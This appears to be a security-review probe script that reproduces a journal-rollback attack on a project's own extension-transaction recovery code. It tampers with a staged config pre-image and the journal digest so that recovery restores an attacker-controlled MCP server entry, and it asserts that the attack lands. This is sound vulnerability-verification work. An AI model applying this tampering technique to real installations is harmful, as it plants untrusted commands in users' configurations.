// #1530 revised C2 plan — R2 finding 6: the first journal-rollback probe omitted `probe` and
// `receiptCommitted`; production (ext-ipc.ts:725-745) provides BOTH. This probe re-runs the SAME attack
// with the branch-equivalent production params and confirms it still lands, so the earlier label is
// corrected ("branch-equivalent params") while the attack conclusion stands.
//
// Equivalence reasoning (verified by this run): the crafted journal has item_0 flipped (live == its
// nextDigest) and item_1 NOT flipped, so `allFlipped` is false (ext-transaction.ts:2545) → the
// `allFlipped && probe && commitReceipt` forward branch (:2547) is never entered → `probe` cannot change
// this outcome. The tx carries no receipt item, so `receiptCommitted` returns false ("confirmed not
// durable" → rollback allowed) — the attacker's favorable, and faithful, case. Thus passing the real
// probe/receiptCommitted does not alter the rollback write-back.
// Run from the worktree root: bun docs/verification/2026-10-15-req234-c2-fence-preverify/journal-rollback-equiv-probe.ts
import assert from "node:assert/strict"
import * as crypto from "node:crypto"
import { mkdtempSync, readFileSync, writeFileSync, rmSync, readdirSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { runExtensionTransaction, recoverExtensionTransactions, readTransactionJournal, type TxPlan, type HealthVerdict } from "../../../packages/ui-mac/src/main/ext-transaction"

const sha = (s: string) => crypto.createHash("sha256").update(s, "utf8").digest("hex")
const root = mkdtempSync(join(tmpdir(), "ac1530-journal-equiv-"))
const cfg = join(root, "alpha.jsonc")
const BENIGN = JSON.stringify({ $schema: "https://opencode.ai/config.json" }, null, 2)
const ATTACKER = JSON.stringify({ $schema: "https://opencode.ai/config.json", mcp: { evil: { type: "local", command: ["attacker"] } } }, null, 2)

try {
  writeFileSync(cfg, BENIGN)
  const plan: TxPlan = {
    items: [
      { key: "mcp--a", action: "config", config: { target: cfg, edits: [{ keyPath: ["mcp", "a"], value: { type: "local", command: ["trusted"] } }] }, manifestDigest: "sha256:a" },
      { key: "mcp--b", action: "config", config: { target: cfg, edits: [{ keyPath: ["mcp", "b"], value: { type: "local", command: ["trusted2"] } }] }, manifestDigest: "sha256:b" },
    ],
  }
  let crashed = false
  try {
    await runExtensionTransaction(root, plan, { populate: () => {}, commitReceipt: () => {}, log: () => {}, crashAt: "mid-switch" as never })
  } catch {
    crashed = true
  }
  assert.equal(crashed, true)

  const txDir = join(root, "ext-tx")
  const jname = readdirSync(join(txDir, "journal")).find((n) => n.endsWith(".json"))!
  const txId = jname.replace(/\.json$/, "")
  const jpath = join(txDir, "journal", jname)
  const journal = JSON.parse(readFileSync(jpath, "utf8"))
  // the two in-fence (W2) writes an attacker makes:
  writeFileSync(join(txDir, "staging", txId, "config-0.pre"), ATTACKER)
  journal.items[0].config.preDigest = sha(ATTACKER)
  writeFileSync(jpath, JSON.stringify(journal, null, 2))

  // Branch-equivalent production params: real probe + receiptCommitted + commitReceipt (ext-ipc.ts:725-745).
  const probe = (): HealthVerdict => ({ healthy: true })
  const rec = await recoverExtensionTransactions(root, {
    probe,
    commitReceipt: () => {},
    receiptCommitted: () => false, // this tx has no receipt item ⇒ confirmed-not-durable ⇒ rollback allowed
    pidAlive: () => false,
    log: () => {},
  })
  const after = readFileSync(cfg, "utf8")
  const landed = after === ATTACKER
  console.log(JSON.stringify({ params: "probe+receiptCommitted+commitReceipt", recoveryOk: rec.ok, reportAction: rec.reports[0]?.action, journalState: readTransactionJournal(root, txId)?.state, attackerLanded: landed }, null, 2))
  console.log(landed ? "RESULT: ATTACK CONFIRMED under branch-equivalent production params" : "RESULT: attack did not land")
  assert.equal(landed, true)
  assert.ok(after.includes('"attacker"'))
  process.exitCode = 0
} finally {
  rmSync(root, { recursive: true, force: true })
}
